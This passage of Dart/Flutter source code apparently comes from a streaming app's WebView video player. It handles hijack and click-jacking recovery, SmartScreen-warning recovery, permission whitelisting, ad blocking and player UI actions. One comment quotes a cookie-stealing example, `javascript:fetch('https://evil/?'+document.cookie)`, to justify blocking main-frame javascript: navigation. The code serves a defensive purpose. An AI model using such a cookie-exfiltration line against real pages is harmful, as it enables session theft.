              // with `hasGesture: true`. `onUpdateVisitedHistory` is
              // the earliest callback that fires with the URL.
              //
              // The same callback fires for *legitimate* in-page
              // navigation (server-switch), so we filter strictly on
              // `about:blank` / `about:` and leave everything else.
              //
              // The `_initialLoadComplete` gate the previous version
              // had is intentionally dropped: streaming sites that SPA-
              // redirect before progress hits 100 % never latched the
              // flag, leaving them with no recovery path on about:blank
              // hijacks. about:blank is never a legitimate main-frame
              // state for a streaming page — treating it as a hijack
              // unconditionally is safe.
              if (!PlayerPlatform.isWindows) return;
              if (_disposed || !mounted) return;
              final urlStr = url?.toString() ?? '';
              if (urlStr == 'about:blank' || urlStr.startsWith('about:')) {
                await _recoverFromHijack(
                  controller,
                  'about:blank navigation',
                  type: 'about_blank',
                );
              }
            },
            onTitleChanged: (controller, title) async {
              // ── Microsoft Defender SmartScreen recovery (Windows only) ──
              //
              // Some streaming embeds server-side redirect to ad
              // domains (e.g. brightadnetwork.com). When SmartScreen's
              // database has the destination flagged, WebView2 replaces
              // the entire page with its red full-screen
              // "Reported Unsafe Site: Navigation Blocked" warning. The
              // page URL stays unchanged but the title flips to a known
              // SmartScreen string. SmartScreen is a Windows Defender
              // feature; on every other platform a title coincidentally
              // containing one of these markers would just be a normal
              // page (e.g. a documentation site discussing the warning
              // dialog), so this whole handler is Windows-only.
              if (!PlayerPlatform.isWindows) return;
              if (_disposed || !mounted) return;
              final t = title ?? '';
              const smartScreenMarkers = [
                'SmartScreen',
                'Reported Unsafe',
                'Navigation Blocked',
                'reported as unsafe',
              ];
              final hit = smartScreenMarkers.any(t.contains);
              if (hit) {
                await _recoverFromHijack(
                  controller,
                  'SmartScreen: "$t"',
                  type: 'smartscreen',
                );
              }
            },
            onReceivedError: (controller, request, error) {
              final isMainFrame = request.isForMainFrame ?? false;
              if (isMainFrame && _loadProgress.value < 50 && mounted) {
                setState(() {
                  _hasError = true;
                  _errorMsg = error.description;
                });
              }
            },
            onReceivedHttpError: (controller, request, errorResponse) {
              final isMainFrame = request.isForMainFrame ?? false;
              final statusCode = errorResponse.statusCode ?? 0;
              if (isMainFrame && statusCode >= 500 && mounted) {
                setState(() {
                  _hasError = true;
                  _errorMsg = 'Server error ($statusCode)';
                });
              }
            },
            onConsoleMessage: (controller, message) {
              if (kDebugMode) {
                final msg = message.message;
                // Still filter out the most common noise.
                if (msg == 'undefined' ||
                    msg.toLowerCase().contains('console.clear') ||
                    msg.startsWith('[object Object]') ||
                    msg.startsWith('Array')) {
                  return;
                }
                // On Windows, some sites flood with Bot/Proxy detection logs (Adscore).
                if (PlayerPlatform.isWindows && msg.contains('Adscore')) return;

                debugPrint('WebView: $msg');
              }
            },
            onPermissionRequest: (controller, request) async {
              // Whitelist: only DRM (Widevine) — required for protected
              // streaming. Camera, microphone, geolocation, MIDI, etc. are
              // never needed by a video player and must always be denied.
              // (PermissionResourceType isn't a real Dart enum, so the set
              // can't be `const`.)
              final allowedResources = <PermissionResourceType>{
                PermissionResourceType.PROTECTED_MEDIA_ID,
              };

              final isAllSafe = request.resources.every(
                allowedResources.contains,
              );

              if (isAllSafe) {
                return PermissionResponse(
                  resources: request.resources,
                  action: PermissionResponseAction.GRANT,
                );
              }

              if (kDebugMode) {
                debugPrint(
                  'Blocked unauthorized permission request: ${request.resources}',
                );
              }
              return PermissionResponse(
                resources: request.resources,
                action: PermissionResponseAction.DENY,
              );
            },
            onCreateWindow: (controller, createWindowAction) async {
              // We don't open popup windows. Returning false suppresses
              // the new-window request itself; on Windows WebView2, a
              // `target="_blank"` anchor click with `hasGesture: true`
              // then falls back to navigating the CURRENT frame to the
              // anchor's href. When that href is `about:blank`, the
              // player gets wiped — caught and recovered in
              // `onUpdateVisitedHistory` below.
              //
              // We tried pre-empting here with a microtask that called
              // `_recoverFromHijack` before WebView2 could dispatch the
              // fallback. It backfired: the pre-empt fires *before*
              // WebView2 has started the about:blank load, so
              // `stopLoading` is a no-op, the recovery completes
              // trivially, the cooldown latches, and the *real* recovery
              // attempt from `onUpdateVisitedHistory` then gets blocked
              // by the cooldown — leaving the user stuck on about:blank.
              return false;
            },
            shouldOverrideUrlLoading: (controller, navigationAction) async {
              // The native side can fire this AFTER `dispose()` runs on
              // Windows; gating on `_disposed` first prevents the
              // `_providerContainer.read` below from racing the container's
              // own teardown.
              if (_disposed) return NavigationActionPolicy.CANCEL;

              final urlRequest = navigationAction.request;
              final url = urlRequest.url?.toString() ?? '';
              if (url.isEmpty) return NavigationActionPolicy.ALLOW;

              final scheme = urlRequest.url?.scheme ?? '';
              // Main-frame `javascript:` navigation executes the script in
              // the current document's origin. Sub-frames legitimately use
              // `<a href="javascript:void(0)">` as a no-op click target,
              // so we allow it there — but a main-frame jump to
              // `javascript:fetch('https://evil/?'+document.cookie)` from
              // a compromised plugin or hijacked anchor is the textbook
              // DOM-XSS vector. Cancel it unconditionally.
              if (navigationAction.isForMainFrame && scheme == 'javascript') {
                return NavigationActionPolicy.CANCEL;
              }
              if (scheme.isNotEmpty &&
                  scheme != 'https' &&
                  scheme != 'http' &&
                  scheme != 'blob' &&
                  scheme != 'data' &&
                  scheme != 'about' &&
                  scheme != 'javascript') {
                return NavigationActionPolicy.CANCEL;
              }

              // Click-jacker about:blank guard.
              //
              // A common pattern on streaming sites — especially visible
              // on Windows WebView2 — is an invisible
              // `<a href="about:blank" target="_blank">` overlaid on top of
              // the player. The user click fires onCreateWindow (which we
              // reject by returning false), but WebView2's fallback for a
              // suppressed `target="_blank"` navigation is to load the
              // link in the CURRENT frame instead, blanking out the video.
              //
              // After the initial load, any main-frame navigation to
              // about:blank is treated as that hijack and cancelled. Sub-
              // frames are left alone — some legitimate players use a
              // brief about:blank intermediate inside iframes.
              if (navigationAction.isForMainFrame &&
                  _initialLoadComplete &&
                  (url == 'about:blank' || scheme == 'about')) {
                return NavigationActionPolicy.CANCEL;
              }

              // Use the cached ProviderContainer directly — `ref.read()`
              // throws under Riverpod 3.x once the widget element starts
              // unmounting, and on Windows this callback can fire after
              // the user has already popped the player route.
              final blocklist =
                  _providerContainer.read(adBlocklistProvider).value ??
                  _providerContainer.read(adBlocklistFallbackProvider);
              if (blocklist?.isBlocked(url) ?? false) {
                return NavigationActionPolicy.CANCEL;
              }

              // Cross-domain main-frame guard.
              //
              // We use _initialLoadComplete (latched true on the first
              // progress=100 event) instead of the live _loadProgress, because
              // a programmatic location.assign('evil.com') triggers
              // shouldOverrideUrlLoading *while* progress is dropping back to
              // 0 — gating on `_loadProgress == 100` would let the redirect
              // through. Once the original page has loaded, every cross-base
              // main-frame nav is treated as a hijack and cancelled.
              if (navigationAction.isForMainFrame &&
                  _initialLoadComplete &&
                  _initialHostBase.isNotEmpty) {
                final newBase = HostUtils.registeredDomain(
                  urlRequest.url?.host ?? '',
                );
                if (newBase.isNotEmpty && newBase != _initialHostBase) {
                  return NavigationActionPolicy.CANCEL;
                }
              }
              return NavigationActionPolicy.ALLOW;
            },
            shouldInterceptRequest: PlayerPlatform.useNativeAdBlocking
                ? (controller, request) async {
                    // Native side queues callbacks; one may fire after
                    // dispose. Same rationale as shouldOverrideUrlLoading.
                    if (_disposed) return null;
                    final url = request.url.toString();
                    final blocklist =
                        _providerContainer.read(adBlocklistProvider).value ??
                        _providerContainer.read(adBlocklistFallbackProvider);
                    if (blocklist?.isBlocked(url) ?? false) {
                      return WebResourceResponse(
                        contentType: 'text/plain',
                        data: null,
                      );
                    }
                    return null;
                  }
                : null,
          ),
        );
      },
    );
  }

  // ─── Progress Bar ─────────────────────────────────────────────────────────

  Widget _buildProgressBar() {
    if (_hasError) return const SizedBox.shrink();
    // ValueListenableBuilder so only this widget rebuilds when progress
    // changes (previously every percent rebuilt the whole player tree).
    return Positioned(
      top: 0,
      left: 0,
      right: 0,
      child: ValueListenableBuilder<double>(
        valueListenable: _loadProgress,
        builder: (context, progress, _) {
          if (progress >= 100) return const SizedBox.shrink();
          return LinearProgressIndicator(
            value: progress / 100,
            backgroundColor: Colors.white12,
            valueColor: const AlwaysStoppedAnimation<Color>(AppColors.primary),
            minHeight: 2,
          );
        },
      ),
    );
  }

  // ─── Initial Loading Overlay ──────────────────────────────────────────────

  Widget _buildLoadingOverlay() {
    if (_hasError) return const SizedBox.shrink();
    // Only shown during the very first load (progress ≤ 15%).
    // Wrapped in IgnorePointer so taps pass through to the WebView
    // even while the spinner is visible — fixes laggy play button.
    return ValueListenableBuilder<double>(
      valueListenable: _loadProgress,
      builder: (context, progress, _) {
        if (progress > 15) return const SizedBox.shrink();
        return IgnorePointer(
          child: Container(
            color: Colors.black,
            child: const Center(
              child: CircularProgressIndicator(
                color: AppColors.primary,
                strokeWidth: 2,
              ),
            ),
          ),
        );
      },
    );
  }

  // ─── Error State ─────────────────────────────────────────────────────────

  /// [overrideMessage] / [onRetry] let transient errors (e.g. WebView env
  /// initialisation failure on Windows) render their own message and retry
  /// behaviour without touching `_hasError`/`_errorMsg`, which are owned by
  /// the in-WebView load lifecycle.
  Widget _buildErrorState({String? overrideMessage, VoidCallback? onRetry}) {
    return PlayerErrorView(
      message: overrideMessage ?? _errorMsg,
      onRetry: onRetry ?? _retry,
    );
  }

  // ─── Window Actions ───────────────────────────────────────────────────────

  Widget _buildNextEpisodeOverlay() {
    if (!_showNextEpisodeOverlay) return const SizedBox.shrink();
    return NextEpisodeOverlay(
      progressKey: _nextEpisodeKey,
      fallbackBackdropPath: widget.media.backdropPath,
      active: _overlayActive,
      onPlayNext: _playNextEpisode,
      onDismiss: () {
        // Flip _showNextEpisodeOverlay so the next build short-circuits at
        // the top — leaving it `true` keeps the overlay's
        // `nextEpisodeForProgressProvider` subscription alive even though
        // the widget is off-screen.
        _overlayTimer?.cancel();
        setState(() {
          _showNextEpisodeOverlay = false;
          _overlayActive = false;
          _dismissedNextEpisodeOverlay = true;
        });
      },
      onHoverEnter: () => _overlayTimer?.cancel(),
      onHoverExit: _startOverlayTimer,
    );
  }

  void _playNextEpisode(int nextSeason, int nextEpisode) {
    if (!mounted) return;

    // Resolve the plugin and new URL before navigating
    final plugins =
        ref.read(pluginsForHookProvider(TriggerHook.mediaHeader)).value ?? [];
    final plugin = PluginUrlResolver.pickPlugin(
      plugins,
      savedId: widget.pluginId,
      preferredId: ref.read(preferredPluginProvider),
    );
    if (plugin == null) return;

    final nextUrl = PluginUrlResolver.resolve(
      plugin,
      widget.media,
      season: nextSeason,
      episode: nextEpisode,
    );

    if (_isNavigating) return;
    _isNavigating = true;
    // Tell our own dispose() to NOT restore portrait — the new player
    // route will re-lock landscape in its initState and we'd otherwise
    // race against it (iOS forces a rotation to whichever
    // setPreferredOrientations call landed last).
    _navigatingToAnotherPlayer = true;

    // Clean up current webview before navigating to free resources.
    _cleanupWebView();

    Future.microtask(() {
      if (!mounted) {
        // The route disappeared before the microtask ran. Reset both flags
        // so we don't leave the (now detached) state stuck pretending it's
        // mid-navigation.
        _isNavigating = false;
        _navigatingToAnotherPlayer = false;
        return;
      }
      try {
        context.pushReplacement(
          '/player',
          extra: PlayerArgs(
            url: nextUrl,
            media: widget.media,
            pluginName: plugin.name,
            pluginId: plugin.pluginId,
            season: nextSeason,
            episode: nextEpisode,
          ),
        );
      } catch (e) {
        _isNavigating = false;
        _navigatingToAnotherPlayer = false;
        if (kDebugMode) debugPrint('_playNextEpisode push failed: $e');
      }
    });
  }

  Widget _buildWindowActions() {
    return PlayerWindowActions(
      showControls: _showControls,
      isFullScreen: _isFullScreen,
      onToggleFullScreen: _toggleFullScreen,
      onDismiss: _dismiss,
    );
  }

  Future<void> _toggleFullScreen() async {
    final isFull = await windowManager.isFullScreen();
    await windowManager.setFullScreen(!isFull);
    // Intentionally NO setState here — the WindowListener (registered in
    // initState) updates `_isFullScreen` from `onWindowEnterFullScreen` /
    // `onWindowLeaveFullScreen` once the OS confirms the transition.
    // Writing here too would race the listener: if the user toggled
    // fullscreen externally during the awaits above, the listener would
    // write the correct value first and our `setState(!isFull)` would
    // clobber it with the value we captured BEFORE the toggle.
  }

  // ─── Actions ──────────────────────────────────────────────────────────────

  Future<void> _dismiss() async {
    if (_isNavigating) return;
    _isNavigating = true;

    try {
      if (PlayerPlatform.isWindows) {
        await windowManager.setFullScreen(false);
      }
      if (!mounted) {
        // The widget is already being torn down; nothing to pop. Reset the
        // flag so a re-entrant call after a quick rebuild isn't wedged.
        _isNavigating = false;
        return;
      }
      context.pop();
    } catch (e) {
      // Any failure (windowManager error, GoRouter pop refused) must
      // unwedge the screen so the user can try again.
      _isNavigating = false;
      if (kDebugMode) debugPrint('_dismiss failed: $e');
    }
  }

  /// System-back handler — leaves the player AND jumps to /home in one
  /// step. Uses `context.go('/home')` (not `pop`) so the user lands on
  /// the app's root regardless of which tab they came from. Pairs with
  /// the shell's `PopScope` which then arms the "press back again to
  /// exit" prompt.
  Future<void> _backToHome() async {
    if (_isNavigating) return;
    _isNavigating = true;
    try {
      if (PlayerPlatform.isWindows) {
        await windowManager.setFullScreen(false);
      }
      if (!mounted) {
        _isNavigating = false;
        return;
      }
      context.go('/home');
    } catch (e) {
      _isNavigating = false;
      if (kDebugMode) debugPrint('_backToHome failed: $e');
    }
  }

  void _retry() {
    // Reset every piece of latched state that depends on the page-load
    // lifecycle. The previous implementation only flipped `_hasError`,
    // leaving the recovery circuit-breaker counter, the per-type cooldown
    // map, and `_initialLoadComplete` carrying forward — so a user who
    // tripped the breaker (e.g. SmartScreen loop) could not actually
    // escape it via the Retry button, and the recovery gates would
    // misfire as soon as the page started loading again.
    _loadProgress.value = 0;
    _recentRecoveries.clear();
    _lastRecoveryByType.clear();
    _initialLoadComplete = false;
    setState(() {
      _hasError = false;
      _errorMsg = '';
    });
    // Re-issue the original URL on the existing controller. The widget's
    // `ValueKey` is bound to `widget.url`, which doesn't change, so the
    // InAppWebView is reused — without this explicit `loadUrl` it would
    // keep showing the previously-failed page and Retry would be dead UI.
    unawaited(
      _controller?.loadUrl(urlRequest: URLRequest(url: WebUri(widget.url))),
    );
  }
}
